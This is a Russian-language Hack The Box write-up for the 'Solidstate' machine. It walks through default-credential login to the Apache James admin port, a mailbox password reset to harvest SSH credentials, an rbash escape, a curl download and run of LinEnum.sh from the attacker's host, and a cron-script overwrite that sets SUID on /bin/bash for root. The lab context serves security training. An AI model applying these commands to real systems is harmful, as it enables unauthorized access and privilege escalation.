# Solidstate (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Средне  
> Результат: root

---

## Цепочка Атаки

```text
Разведка
├── nmap -sC -sV -A → 22 (SSH), 25 (SMTP), 80 (Apache 2.4.25), 110 (POP3), 119 (NNTP)
├── nmap -p- → 4555 (rsip / Apache James admin)
└── nc 10.129.1.53 4555 → root:root

Первичный Доступ (Apache James)
├── help → listusers → james, thomas, john, mindy, mailadmin
├── setpassword mindy writeup
├── telnet 10.129.1.53 110 → USER mindy / PASS writeup
├── LIST → RETR 2 → письмо от mailadmin
│   └── mindy:<PASSWORD> (SSH creds)
└── ssh mindy@10.129.1.53 → user.txt

Escaping rbash
├── cat /etc/passwd → mindy:/bin/rbash
├── ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
└── ssh mindy@10.129.1.53 → bash -ip

Повышение Привилегий
├── LinEnum.sh → /opt/tmp.py (world-writable, root-owned)
├── cat /opt/tmp.py → os.system('rm -r /tmp/*')
├── nano /opt/tmp.py → замена на os.system('chmod +s /bin/bash')
├── wait (cron) → ls -la /bin/bash → -rwsr-sr-x
└── /bin/bash -ip → root.txt
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Debian 9 (stretch), Apache James 2.3.2 (SMTP/POP3/NNTP). Пароль root в админ-панели James дефолтный. Пользователи: james, thomas, john, mindy, mailadmin.

---

## Разведка

### Port Scan

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.1.53
```

| Порт | Сервис | Версия                         |
|------|--------|--------------------------------|
| 22   | SSH    | OpenSSH 7.4p1 Debian 10+deb9u1 |
| 25   | SMTP   | (Apache James)                 |
| 80   | HTTP   | Apache httpd 2.4.25 (Debian)   |
| 110  | POP3   | (Apache James)                 |
| 119  | NNTP   | (Apache James)                 |

Полное сканирование:

```bash
sudo nmap -p- -T4 10.129.1.53
```

Открыт 4555/tcp (rsip) - admin-интерфейс Apache James.

---

## Первичный Доступ

### Apache James admin

```bash
nc 10.129.1.53 4555
```

Логин `root:root`. Далее:

```
help
listusers
```

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

### Сброс пароля mindy

```
setpassword mindy writeup
```

### Чтение почты через POP3

```bash
telnet 10.129.1.53 110
USER mindy
PASS writeup
LIST
RETR 2
```

Письмо от mailadmin:

```
username: mindy
pass: <PASSWORD>
```

### SSH

```bash
ssh mindy@10.129.1.53
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

### Escape rbash

```bash
cat /etc/passwd
# mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
```

Обход через симлинк:

```bash
ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
ssh mindy@10.129.1.53
ls -la bin
bash -ip
```

---

## Повышение Привилегий

### LinEnum

```bash
python3 -m http.server 80  # на Kali
cd /dev/shm
curl 10.10.16.15/LinEnum.sh -o LinEnum.sh
bash LinEnum.sh -t
```

Находка:

```
-rwxrwxrwx 1 root root 105 /opt/tmp.py
```

### Анализ /opt/tmp.py

```bash
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Скрипт запускается по cron от root, но доступен на запись всем.

### Подмена содержимого

```bash
nano /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod +s /bin/bash')
except:
     sys.exit()
```

Ждём cron:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1265272 ... /bin/bash
```

### Root

```bash
/bin/bash -ip
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Флаги

| Флаг | Значение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

- **Apache James admin на порту 4555** - дефолтные `root:root` дают полный контроль над списком пользователей и возможность сбросить пароль любому.
- **Пароли в email-переписке** - POP3 открытым текстом отдаёт тело письма с учётными данными.
- **rbash обходится симлинком** - если есть право на запись в `~/bin` (или в путь из `$PATH`), создание симлинка на `/bin/bash` снимает ограничение.
- **World-writable скрипты, запускаемые по cron от root** - самый прямолинейный вектор LPE: подменяем содержимое, ждём срабатывания, получаем SUID-бинарь.
